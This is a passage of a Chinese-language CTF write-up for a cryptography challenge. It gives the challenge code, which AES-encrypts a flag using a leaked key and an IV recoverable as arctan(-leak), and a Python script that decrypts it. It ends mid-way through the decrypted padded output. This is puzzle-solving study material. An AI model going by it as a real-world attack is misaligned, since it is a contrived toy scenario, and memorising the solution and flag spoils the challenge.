62], [123, 87, 87, 110], [3, 81, 111, 28], [20, 2, 91, 37], [93, 101, 77, 93], [27, 16, 31, 105], [95, 81, 87, 17], [10, 103, 21, 102], [81, 57, 118, 82], [15, 92, 60, 71], [16, 84, 126, 49], [35, 26, 2, 120], [70, 86, 45, 9], [29, 8, 40, 66], [99, 77, 14, 9], [12, 70, 50, 52], [21, 21, 85, 54], [91, 94, 100, 85], [9, 42, 47, 14], [117, 55, 17, 99], [53, 45, 4, 72], [49, 10, 27, 121], [108, 61, 73, 42], [121, 42, 41, 71], [49, 63, 50, 117], [5, 78, 24, 101], [0, 117, 21, 46], [90, 43, 47, 32], [74, 85, 118, 84], [13, 73, 18, 66], [95, 24, 120, 18], [94, 21, 111, 34], [66, 68, 80, 21], [102, 49, 57, 55], [25, 85, 107, 98], [8, 18, 88, 12], [18, 6, 86, 82], [18, 91, 126, 115], [26, 11, 30, 35], [88, 78, 76, 74], [51, 75, 76, 15], [60, 24, 72, 27], [91, 72, 44, 104], [84, 113, 39, 116], [41, 83, 91, 74], [84, 17, 94, 119], [46, 95, 85, 5], [109, 58, 71, 42], [126, 29, 114, 73], [27, 70, 7, 125], [121, 66, 97, 111], [8, 21, 10, 57], [15, 62, 65, 8], [101, 79, 32, 74], [69, 42, 38, 58], [65, 81, 72, 16], [20, 81, 1, 126], [91, 111, 69, 33], [56, 84, 65, 66], [47, 78, 43, 100], [43, 90, 80, 25], [46, 55, 10, 60], [116, 110, 49, 116], [72, 115, 38, 104], [79, 43, 74, 106], [86, 113, 84, 76], [102, 2, 119, 3], [126, 25, 83, 44], [37, 83, 46, 40], [13, 75, 101, 101], [76, 93, 3, 63], [69, 9, 84, 37], [103, 47, 106, 80], [72, 104, 85, 19], [124, 118, 34, 81], [57, 25, 52, 119], [44, 56, 63, 90], [123, 46, 124, 31], [19, 116, 23, 77], [126, 78, 37, 93], [34, 95, 43, 98], [37, 90, 32, 97], [106, 8, 80, 8], [90, 5, 113, 68], [99, 40, 39, 18], [90, 37, 48, 45], [56, 13, 76, 6], [68, 33, 52, 102], [62, 45, 29, 123], [100, 21, 73, 92], [92, 18, 118, 23], [84, 86, 42, 83], [107, 8, 71, 52], [114, 106, 78, 85], [10, 120, 115, 119], [27, 49, 124, 16], [65, 40, 48, 37], [69, 42, 8, 29], [35, 39, 55, 102], [58, 19, 41, 75], [17, 2, 113, 12], [8, 34, 72, 75], [91, 32, 19, 52], [62, 50, 109, 78], [9, 115, 35, 50], [42, 83, 78, 41], [34, 94, 97, 58], [56, 73, 25, 115], [55, 12, 16, 86], [97, 95, 30, 92], [47, 105, 70, 68], [50, 18, 51, 23], [46, 57, 80, 29], [4, 66, 123, 24], [55, 53, 26, 36], [71, 59, 104, 91], [94, 3, 1, 34], [57, 8, 85, 102], [89, 73, 115, 25], [13, 38, 81, 76], [104, 30, 81, 104], [55, 101, 95, 101], [69, 65, 5, 11], [123, 105, 84, 125], [38, 110, 4, 28], [112, 115, 92, 71], [90, 120, 112, 39], [50, 18, 107, 71], [95, 63, 118, 93], [93, 111, 59, 55], [17, 15, 2, 88], [78, 126, 37, 12], [56, 112, 53, 12], [65, 34, 82, 100], [9, 94, 72, 99], [78, 76, 43, 91], [7, 88, 107, 31], [43, 91, 97, 4], [113, 112, 36, 15], [8, 97, 23, 84], [65, 92, 31, 63], [54, 38, 119, 103], [89, 50, 57, 50], [61, 37, 87, 0], [21, 35, 44, 22], [20, 32, 95, 116], [10, 94, 103, 84], [59, 29, 7, 50], [98, 33, 87, 33], [7, 96, 36, 67], [85, 10, 35, 98], [65, 49, 19, 62], [56, 67, 14, 91], [30, 49, 111, 77], [121, 49, 108, 119], [89, 67, 115, 69], [65, 8, 0, 82], [117, 57, 117, 23], [23, 38, 2, 98], [60, 28, 94, 93], [23, 65, 8, 114], [121, 105, 122, 40], [120, 12, 21, 112], [55, 51, 2, 77], [48, 41, 113, 62], [66, 82, 117, 119], [4, 15, 5, 21], [41, 14, 12, 80], [23, 61, 106, 16], [23, 53, 122, 68], [6, 54, 5, 101], [69, 49, 7, 79], [17, 70, 64, 88], [103, 30, 76, 31], [108, 82, 90, 109], [55, 56, 113, 37], [93, 99, 126, 44], [1, 46, 105, 124], [55, 54, 35, 115], [0, 89, 53, 97], [67, 111, 107, 80], [92, 122, 40, 64], [75, 2, 126, 118], [90, 84, 43, 74], [101, 69, 60, 17], [104, 10, 4, 122], [94, 4, 115, 91], [15, 11, 111, 105], [9, 7, 32, 101], [77, 18, 55, 56], [66, 7, 117, 108], [116, 121, 33, 66], [32, 41, 83, 125], [60, 52, 70, 58], [125, 54, 93, 15], [70, 19, 10, 58], [83, 94, 61, 126], [95, 85, 80, 44], [25, 89, 117, 74], [12, 17, 63, 87], [118, 80, 96, 26], [6, 97, 79, 38], [97, 3, 107, 95], [7, 82, 106, 92], [83, 100, 119, 95], [81, 26, 99, 56], [25, 60, 51, 122], [56, 18, 22, 84], [9, 72, 107, 114], [80, 97, 92, 52], [108, 47, 58, 46], [9, 47, 7, 47], [115, 68, 91, 7], [14, 120, 87, 122], [97, 15, 40, 79], [5, 92, 85, 93], [4, 97, 73, 63], [25, 22, 92, 108], [88, 4, 34, 86], [0, 43, 21, 57], [67, 90, 36, 50], [15, 126, 37, 12], [92, 73, 96, 71], [76, 107, 27, 115], [79, 8, 68, 55], [38, 12, 120, 126], [54, 46, 7, 69], [72, 114, 93, 60], [59, 98, 27, 102], [50, 76, 87, 19], [77, 107, 29, 40], [36, 73, 21, 123], [36, 89, 82, 74], [24, 73, 118, 86], [58, 89, 115, 106], [12, 27, 33, 72], [28, 94, 21, 26], [0, 79, 48, 110], [72, 62, 82, 57], [65, 84, 114, 97], [80, 68, 52, 52], [119, 35, 103, 101], [10, 67, 68, 69], [101, 17, 54, 40], [98, 46, 21, 42], [30, 39, 56, 118], [27, 33, 77, 114], [66, 74, 61, 63], [23, 13, 14, 47], [88, 30, 122, 119], [15, 58, 55, 52], [56, 27, 47, 45], [119, 95, 59, 14], [84, 69, 5, 83], [21, 35, 39, 36], [10, 92, 68, 17], [79, 67, 111, 38], [36, 1, 4, 117], [117, 30, 5, 7], [112, 15, 115, 123], [54, 47, 18, 93], [102, 111, 3, 68], [91, 91, 5, 44], [123, 118, 57, 32], [12, 121, 31, 103], [114, 52, 105, 12], [100, 28, 117, 102], [51, 42, 12, 124], [47, 1, 42, 47], [28, 3, 22, 100], [103, 105, 119, 24], [101, 59, 13, 78], [79, 36, 61, 54], [11, 46, 75, 116], [31, 73, 118, 0], [92, 32, 0, 124], [77, 85, 25, 90], [29, 21, 74, 7], [3, 66, 11, 8], [112, 91, 50, 53], [45, 113, 99, 123], [35, 65, 85, 22], [108, 99, 42, 1], [103, 113, 116, 72], [125, 74, 112, 24], [75, 79, 80, 12], [83, 44, 94, 86], [64, 20, 0, 8], [104, 126, 31, 120], [85, 75, 61, 74], [36, 93, 36, 102], [70, 54, 101, 83], [90, 46, 109, 83], [112, 126, 114, 23], [16, 123, 97, 62], [118, 86, 108, 53], [99, 18, 2, 18], [103, 3, 38, 8], [99, 49, 123, 81], [37, 75, 89, 53], [34, 77, 27, 122], [29, 8, 40, 66], [119, 13, 64, 83], [4, 108, 116, 121], [49, 87, 1, 92], [15, 63, 80, 62], [27, 81, 100, 83], [7, 90, 16, 0], [13, 50, 61, 65], [51, 64, 76, 5], [55, 100, 106, 66], [52, 102, 105, 2], [49, 34, 89, 116], [24, 55, 11, 27], [91, 48, 73, 38], [27, 5, 1, 126], [66, 55, 80, 19], [52, 118, 104, 43], [36, 1, 111, 60], [65, 4, 34, 17], [54, 22, 0, 39], [52, 30, 64, 62], [26, 40, 32, 86], [93, 71, 41, 47], [77, 23, 15, 9], [11, 20, 51, 31], [64, 50, 37, 50], [17, 49, 80, 37], [119, 115, 115, 50], [20, 86, 27, 5], [101, 65, 17, 78], [56, 25, 125, 56], [16, 118, 2, 96], [114, 108, 69, 121], [14, 37, 76, 101], [113, 124, 121, 82], [43, 120, 35, 94], [82, 67, 23, 43], [9, 79, 47, 122], [39, 28, 110, 31], [35, 48, 27, 16], [72, 8, 115, 66], [54, 46, 122, 19], [77, 77, 30, 74], [58, 63, 81, 96], [6, 122, 75, 63], [115, 31, 119, 110], [82, 86, 89, 1], [79, 100, 6, 110], [117, 67, 15, 13], [4, 15, 63, 0], [106, 108, 122, 107], [34, 72, 0, 114], [20, 0, 32, 56], [121, 104, 66, 3], [86, 28, 76, 84], [85, 9, 60, 45], [95, 80, 78, 65], [39, 85, 50, 49], [42, 103, 36, 90], [70, 99, 116, 117], [34, 15, 40, 52], [24, 49, 19, 31], [98, 90, 95, 89], [63, 45, 40, 77], [114, 14, 30, 106], [10, 35, 116, 9], [103, 111, 112, 16], [71, 112, 71, 32], [77, 31, 105, 64], [84, 87, 24, 67], [1, 27, 123, 57], [104, 29, 87, 123], [110, 39, 67, 7], [28, 70, 108, 113], [96, 9, 101, 36], [13, 28, 6, 13], [69, 81, 89, 26], [79, 113, 77, 91], [112, 62, 104, 117], [109, 95, 55, 83], [78, 68, 98, 14], [73, 79, 96, 12], [108, 39, 97, 49], [27, 111, 106, 100], [82, 70, 9, 36], [48, 31, 90, 70], [99, 92, 45, 35], [55, 100, 31, 37], [75, 17, 69, 35], [12, 38, 119, 112], [103, 34, 63, 76], [26, 19, 91, 111], [74, 122, 12, 78], [64, 117, 16, 60], [2, 97, 122, 106], [62, 79, 56, 30], [71, 47, 13, 22], [38, 78, 116, 16], [87, 28, 94, 76], [77, 126, 94, 116], [83, 46, 104, 90], [5, 95, 13, 26], [47, 10, 46, 115], [82, 19, 91, 70], [111, 72, 49, 65], [18, 103, 59, 72], [17, 37, 56, 24], [19, 120, 24, 64], [28, 40, 11, 20], [18, 19, 80, 62], [37, 11, 74, 14], [109, 97, 75, 72], [116, 65, 52, 121], [95, 63, 82, 122], [88, 93, 54, 93], [77, 30, 65, 121], [99, 121, 42, 87], [62, 52, 44, 6], [79, 60, 55, 4], [96, 64, 6, 20], [94, 114, 90, 8], [123, 98, 29, 27], [116, 84, 31, 80], [9, 77, 45, 45], [120, 33, 63, 15], [51, 44, 66, 25], [2, 46, 72, 94], [107, 113, 50, 46], [115, 64, 126, 85], [64, 10, 28, 78], [84, 112, 64, 103], [59, 114, 15, 82], [65, 122, 104, 89], [113, 122, 21, 11], [69, 106, 19, 78], [42, 93, 125, 0], [7, 123, 82, 70], [103, 114, 62, 92], [15, 30, 78, 114], [4, 78, 111, 60], [40, 80, 34, 55], [3, 87, 120, 27], [122, 64, 3, 122], [24, 49, 31, 81], [26, 43, 100, 19], [52, 78, 2, 97], [116, 45, 15, 33], [21, 119, 92, 86], [28, 118, 71, 24], [106, 15, 0, 79], [36, 4, 52, 73], [22, 43, 8, 60], [96, 22, 9, 100], [19, 64, 26, 96], [97, 61, 22, 39], [6, 112, 76, 38], [58, 6, 97, 94], [103, 87, 87, 101], [17, 49, 80, 37], [117, 33, 26, 8], [59, 108, 78, 91], [113, 28, 30, 44], [119, 78, 72, 20], [49, 101, 77, 2], [26, 18, 35, 7], [34, 38, 99, 37], [45, 52, 90, 27], [108, 31, 118, 67], [3, 37, 29, 88], [111, 96, 12, 111], [91, 111, 106, 100], [52, 78, 117, 80], [14, 51, 87, 0], [1, 52, 116, 1], [117, 2, 33, 48], [57, 0, 48, 34], [59, 14, 84, 63], [82, 83, 8, 82], [58, 100, 32, 33], [75, 29, 112, 103], [0, 49, 45, 54], [94, 9, 51, 110], [54, 61, 27, 47], [88, 89, 23, 37], [73, 43, 0, 32], [123, 6, 35, 78], [73, 72, 119, 64], [81, 46, 11, 102], [42, 124, 47, 8], [50, 66, 3, 40], [116, 7, 51, 20], [47, 112, 99, 7], [42, 37, 86, 89], [18, 74, 78, 101], [57, 85, 75, 7], [26, 90, 35, 10], [72, 126, 10, 77], [55, 12, 5, 78], [37, 87, 85, 96], [91, 9, 114, 68], [79, 76, 44, 20], [84, 52, 63, 56], [95, 9, 22, 117], [96, 38, 50, 67], [43, 114, 45, 56], [94, 21, 74, 107], [92, 82, 81, 71], [40, 10, 10, 90], [20, 18, 15, 56], [72, 2, 30, 22], [50, 31, 123, 20], [85, 40, 115, 115], [93, 1, 48, 47], [111, 118, 45, 34], [9, 122, 37, 121], [60, 27, 77, 41], [122, 38, 22, 39], [115, 66, 74, 126], [77, 67, 90, 78], [96, 3, 53, 52], [5, 26, 120, 101], [45, 100, 72, 6], [106, 56, 87, 77], [52, 68, 102, 95], [1, 13, 36, 33], [58, 27, 35, 8], [52, 5, 38, 35], [102, 82, 63, 47], [24, 71, 119, 43], [11, 36, 90, 13], [11, 93, 27, 23], [4, 107, 26, 125], [85, 9, 5, 13], [116, 25, 55, 119], [73, 82, 73, 2], [40, 123, 77, 41], [10, 98, 51, 111], [23, 79, 120, 54], [56, 18, 22, 84], [61, 115, 51, 109], [33, 5, 12, 121], [8, 81, 35, 70], [22, 39, 103, 2], [38, 74, 66, 126], [83, 20, 117, 85], [8, 32, 91, 98], [37, 31, 94, 119], [7, 30, 45, 43], [68, 16, 124, 97], [86, 124, 37, 21], [29, 101, 15, 30], [27, 31, 52, 45], [47, 37, 102, 3], [117, 49, 54, 89], [48, 94, 126, 66], [42, 115, 63, 104], [14, 74, 6, 112], [68, 125, 4, 5], [66, 3, 78, 52], [108, 33, 6, 77], [77, 99, 16, 52], [61, 78, 73, 70], [108, 106, 124, 0], [23, 35, 119, 118], [125, 124, 37, 65], [69, 30, 61, 110], [77, 10, 120, 118], [53, 121, 24, 30], [87, 32, 29, 63], [54, 64, 1, 3], [16, 59, 104, 25], [30, 6, 59, 102], [43, 120, 35, 94], [89, 13, 69, 39], [87, 78, 100, 14], [83, 17, 14, 4], [24, 49, 31, 81], [73, 32, 72, 10], [0, 22, 61, 54], [81, 42, 70, 13], [108, 56, 52, 2], [25, 99, 116, 72], [66, 23, 18, 102], [121, 115, 47, 12], [96, 37, 123, 48], [64, 69, 4, 39], [78, 38, 124, 31], [27, 69, 10, 70], [5, 29, 2, 85], [30, 45, 56, 7], [31, 25, 120, 61], [36, 89, 89, 118], [98, 63, 18, 21], [121, 83, 36, 57], [60, 5, 86, 17], [121, 55, 117, 58], [12, 96, 4, 27], [119, 63, 124, 37], [96, 27, 45, 91], [42, 119, 8, 103], [104, 42, 68, 37], [104, 55, 41, 38], [120, 3, 50, 87], [120, 121, 20, 67], [58, 123, 50, 28], [103, 62, 58, 20], [97, 27, 89, 102], [7, 51, 56, 108], [73, 60, 10, 77], [56, 72, 103, 69], [101, 89, 18, 66], [115, 35, 80, 36], [98, 103, 39, 63], [29, 126, 67, 76], [27, 97, 15, 79], [36, 6, 17, 90], [126, 54, 101, 42], [115, 66, 74, 126], [78, 80, 62, 83], [60, 11, 31, 88], [16, 73, 108, 13]]\n'''\n\nkey = os.urandom(16)\nencrypted = AES.new(key=key, iv=iv, mode=AES.MODE_CBC).encrypt(b\"\".join([pad(i.encode(), 16) for i in flag]))\n\nprint(leak)\nprint(key)\nprint(encrypted)\n\n'''\n-3.257518803980229925210589904230583482986646342139415561576950148286382674434770529248486501793457710730252401258721482142654716015216299244487794967600132597049154513815052213387666360825101667524635777006510550117512116441539852315185793280311905620746025669520152068447372368293640072502196959919309286241\nb'\\x8fj\\x94\\x98-\\x1fd\\xd5\\x89\\xbe\\xa9*Tu\\x90\\xb7'\nb'\\x9fT@\\xbc\\x82\\x8esQ\\x1e\\xd8\\x1d\\xdb\\x9b\\xb4\\xf8rU\\xc8\\xa0\\xcb\\xaf H\\xa9.\\x04\\x1e\\xd2\\x92\\x1f\\x0fBja-\\x965x\\xa8@\\xc9x\\xf9\\xaf\\x87\\xd1\\xa5}\\xfc\\x1b\\xe0#\\xc3m\\xc9\\x8973\\x1c\\x1f\\x13\\x8f\\xb2a\\xae\\xa9]\\xb9\\xc2\\xe8\\x83A\\x80\\x13g\\xc9a\\x1c<\\x8a\\x9c&\\xd9\\xbd\\x06\\xef\\xba9\\xb0\\x03\\x9f\\x022\\xc9\\x13\\x9a\\xffXPG\\xc6o\\xc0\\xeaV7)XG9L\\x84N7U\\xe3Wn0G\\x8e\\xd3\\x04(\\n\\x08\\xb9\\x17\\xe6\\xf1\\xaa\\xb7\\x8a@$\\x16\\x13\\x06A\\x00\\xc9Z\\xdf\\x7fQ\\xc9\\x08\\xb4\\xf3P\\xfcpe\\xe2\\xeb\\x96\\x0e(-\\xde\\x17\\xd1\\x01\\x1c_\\x82\\x8b\\x9fw\\xc8\\x86\\xfbw\\xb5\\xf7\\xd0\\xc8\\x1784\\xe3?\\x00\\x0b.)\\xb7\\xbc\\x8e{\\xe0\\xae\\x8d$\\x0f\\x19\\'\\xb6\\xee@d\\x00\\xd9\\x84\\x8c\\x0e\\xa3,\\xc6a\\xa3\\xba*1\\xfd<\\xfd\\x18\\xd6\\x9e\\x8c4\\x8e#\\xfd\\xbd&0R\\xeddE,\\xed\\xb6\\x1e\\x00\\x11\\xa6K\\xd3\\x1dT\\x8c5\\x8e\\x00\\xea\\x10\\xe9\\'u\"B#\\xa1#\\xd8\\xe3\\xf5j\\xbc\\x94M\\xda\\xe3\\xcb*\\xf0W1\\xa0\\x80\\x1d\\xfc\\xbfo\\x01?(da\\r\\xb6\\x86\\xd0\\x90\\x88Z\\xa1`B\\x89\\x89\\x89\\xb3v\\xa5\\xf0\\xe0\\x0c\\x8e\\xcc+P\\xfc\\xfd#\\x83\\xe9\\x93\\x96\\n\\xf2\\xa5\\xfb\\xc3\\xc5\\xaa\\x9e\\x89\\x93\\xb6\\xf5\\xea\\x8c%NY\\xc3\\x0eR\\xfas\\xa1\\x13\\xf2/*\\xce\\x8b_:_r\\xeb\\xbe\\x0b\\x8a\\x8c\\x97\\x7f|m}\\xae\\xa9I\\x95\\xcc\\xe7\\x80\\xa5yC4\\x1f5\\xa4P\\xc5\\xbf.\\xf9V\\xe8|\\xbb\\xc3\\xcb\\x98&\\'JB\\x99\\x94\\xc0\\r$\\x0b\\xbe48u\\xeb\\xca\\xa1\\xfbb\\xd8_R\\x97\\x8e\\xaeI\\xfc\\xc2\\xb2\\xd2#@\\xec\\x16\\xf1\\xd7eCQ\\x1cO\\x13\\xca\\xb5\\xd3\\x1a\\xb1\\xf1_D\\x80\\x06\\xa5\\xbe\\xbev\\xbd\\xd6\\xbb\\x9a\\xc9x\\x9cf:\\xcb>\\xa2\\xe1\\xcad\\xde]aw\\xa0\\xdc\\xb2\\xb3{+\\x85\\x8d\\x8b\\xc5\\rT\\xcc\\xd9X\\xd5\\x9b\\r<\\x99m\\xb8b6s\\xbfp\\x0eo~\\xe9&\\xb2{\\xbe\\xee\\x93\\xd2N1\\\\\\x94\\x968IWO7\\xcb\\xb6e\\x80\\xf7\\x9air\\xb2~\\x17\\x1cF\\x0f\\x82T]RBX\\xdex\\x13\\x85\\xfa\\xcd-\\xce\\xdc\\xe4\\xe5^\\x99u\\xb5\\x01\\xd0-\\xc3C\\xcd\\xc4y6\\xb7\\x9d|L1\\xe74\\xf7\\x8cH\\xe9\\xa9\\xfav\\n\\xec;\\xf2\\xa2w\\xfb\\x13_b\\r)z!\\xa3\\xc8\\xa8\\xc2\\xd2\\x10\\x00\\x11\\x11\\r\\xb2&\\xfb\\x04&\\x84\">x6l[\\x06n>\\xa0\\xbe\\x9c`\\xa7\\x9e\\xe0\\xfb\\x85\\x91\\xc4,\\xcf\\xac\\xe11@a\\xed3@\\xfd}\\x8e\\xfaTp\\xcb7\\xe7\\xbf\\xd4\\xe0~b\\xd9\\xe0<\\xba\\x81\\xd4\"e\\xfc\\x939|j#0H\\x86\\xf8\\x0b\\x03\\xd2\\xe8\\xf5\\xe55\\xdc\\xc8\\x06\\\\\\xb7)\\xcc\\x9b\\'\\xf12'\n'''\n\n```\n\n这段代码先用格密码生成公钥、密钥，并用格密码加密部分信息，之后对flag进行AES加密。\n\n这里的key是随机生成的16字节的字符串，可以先处理iv\n\n关于leak的话可以推导出 iv = arctan(-leak)，用 numpy 计算 iv，并结合key和iv解密\n\n```python\nimport numpy as np\nimport struct\nfrom Crypto.Cipher import AES\n\nleak = -3.257518803980229925210589904230583482986646342139415561576950148286382674434770529248486501793457710730252401258721482142654716015216299244487794967600132597049154513815052213387666360825101667524635777006510550117512116441539852315185793280311905620746025669520152068447372368293640072502196959919309286241\nkey = b'\\x8fj\\x94\\x98-\\x1fd\\xd5\\x89\\xbe\\xa9*Tu\\x90\\xb7'\nencrypted = b'\\x9fT@\\xbc\\x82\\x8esQ\\x1e\\xd8\\x1d\\xdb\\x9b\\xb4\\xf8rU\\xc8\\xa0\\xcb\\xaf H\\xa9.\\x04\\x1e\\xd2\\x92\\x1f\\x0fBja-\\x965x\\xa8@\\xc9x\\xf9\\xaf\\x87\\xd1\\xa5}\\xfc\\x1b\\xe0#\\xc3m\\xc9\\x8973\\x1c\\x1f\\x13\\x8f\\xb2a\\xae\\xa9]\\xb9\\xc2\\xe8\\x83A\\x80\\x13g\\xc9a\\x1c<\\x8a\\x9c&\\xd9\\xbd\\x06\\xef\\xba9\\xb0\\x03\\x9f\\x022\\xc9\\x13\\x9a\\xffXPG\\xc6o\\xc0\\xeaV7)XG9L\\x84N7U\\xe3Wn0G\\x8e\\xd3\\x04(\\n\\x08\\xb9\\x17\\xe6\\xf1\\xaa\\xb7\\x8a@$\\x16\\x13\\x06A\\x00\\xc9Z\\xdf\\x7fQ\\xc9\\x08\\xb4\\xf3P\\xfcpe\\xe2\\xeb\\x96\\x0e(-\\xde\\x17\\xd1\\x01\\x1c_\\x82\\x8b\\x9fw\\xc8\\x86\\xfbw\\xb5\\xf7\\xd0\\xc8\\x1784\\xe3?\\x00\\x0b.)\\xb7\\xbc\\x8e{\\xe0\\xae\\x8d$\\x0f\\x19\\'\\xb6\\xee@d\\x00\\xd9\\x84\\x8c\\x0e\\xa3,\\xc6a\\xa3\\xba*1\\xfd<\\xfd\\x18\\xd6\\x9e\\x8c4\\x8e#\\xfd\\xbd&0R\\xeddE,\\xed\\xb6\\x1e\\x00\\x11\\xa6K\\xd3\\x1dT\\x8c5\\x8e\\x00\\xea\\x10\\xe9\\'u\"B#\\xa1#\\xd8\\xe3\\xf5j\\xbc\\x94M\\xda\\xe3\\xcb*\\xf0W1\\xa0\\x80\\x1d\\xfc\\xbfo\\x01?(da\\r\\xb6\\x86\\xd0\\x90\\x88Z\\xa1`B\\x89\\x89\\x89\\xb3v\\xa5\\xf0\\xe0\\x0c\\x8e\\xcc+P\\xfc\\xfd#\\x83\\xe9\\x93\\x96\\n\\xf2\\xa5\\xfb\\xc3\\xc5\\xaa\\x9e\\x89\\x93\\xb6\\xf5\\xea\\x8c%NY\\xc3\\x0eR\\xfas\\xa1\\x13\\xf2/*\\xce\\x8b_:_r\\xeb\\xbe\\x0b\\x8a\\x8c\\x97\\x7f|m}\\xae\\xa9I\\x95\\xcc\\xe7\\x80\\xa5yC4\\x1f5\\xa4P\\xc5\\xbf.\\xf9V\\xe8|\\xbb\\xc3\\xcb\\x98&\\'JB\\x99\\x94\\xc0\\r$\\x0b\\xbe48u\\xeb\\xca\\xa1\\xfbb\\xd8_R\\x97\\x8e\\xaeI\\xfc\\xc2\\xb2\\xd2#@\\xec\\x16\\xf1\\xd7eCQ\\x1cO\\x13\\xca\\xb5\\xd3\\x1a\\xb1\\xf1_D\\x80\\x06\\xa5\\xbe\\xbev\\xbd\\xd6\\xbb\\x9a\\xc9x\\x9cf:\\xcb>\\xa2\\xe1\\xcad\\xde]aw\\xa0\\xdc\\xb2\\xb3{+\\x85\\x8d\\x8b\\xc5\\rT\\xcc\\xd9X\\xd5\\x9b\\r<\\x99m\\xb8b6s\\xbfp\\x0eo~\\xe9&\\xb2{\\xbe\\xee\\x93\\xd2N1\\\\\\x94\\x968IWO7\\xcb\\xb6e\\x80\\xf7\\x9air\\xb2~\\x17\\x1cF\\x0f\\x82T]RBX\\xdex\\x13\\x85\\xfa\\xcd-\\xce\\xdc\\xe4\\xe5^\\x99u\\xb5\\x01\\xd0-\\xc3C\\xcd\\xc4y6\\xb7\\x9d|L1\\xe74\\xf7\\x8cH\\xe9\\xa9\\xfav\\n\\xec;\\xf2\\xa2w\\xfb\\x13_b\\r)z!\\xa3\\xc8\\xa8\\xc2\\xd2\\x10\\x00\\x11\\x11\\r\\xb2&\\xfb\\x04&\\x84\">x6l[\\x06n>\\xa0\\xbe\\x9c`\\xa7\\x9e\\xe0\\xfb\\x85\\x91\\xc4,\\xcf\\xac\\xe11@a\\xed3@\\xfd}\\x8e\\xfaTp\\xcb7\\xe7\\xbf\\xd4\\xe0~b\\xd9\\xe0<\\xba\\x81\\xd4\"e\\xfc\\x939|j#0H\\x86\\xf8\\x0b\\x03\\xd2\\xe8\\xf5\\xe55\\xdc\\xc8\\x06\\\\\\xb7)\\xcc\\x9b\\'\\xf12'\n\n#计算iv\niv_new = np.arctan(-leak)\n#print(iv_new)\n\n#转化iv为16字节\niv_bytes = struct.pack('>d', iv_new) * 2\n\n#解密\ndecrypted = AES.new(key=key,iv = iv_bytes,mode = AES.MODE_CBC).decrypt(encrypted)\n\nprint(decrypted)#输出\n```\n\n这里的话因为iv 的 bytes 表达方式不唯一，需要多种方式去尝试解密，并且解密后的密文可能有杂质，不能直接输出，需要正从中用正则提取 flag\n\n![image-20250524150259427](../image/achieve/202411/黄河CTF/image-20250524150259427.png)\n\n所以最终的wp\n\n```python\nfrom Crypto.Util.Padding import unpad\n\ndata = b'fQr\\xce\\x8b\\x96\\xae\\x1d\\x9c\\xd4+\\x82\\xec\\xe9\\x0c\\xf5l\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0fa\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0fg\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f{\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f6\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0fe\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0ff\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f2\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f5\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0fd\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f1\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0fe\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f-\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0fb\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0fb\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f7\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f6\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f-\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f8\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0fe\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f5\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f3\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f-\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0fd\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0fb\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0fc\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f4\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f-\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\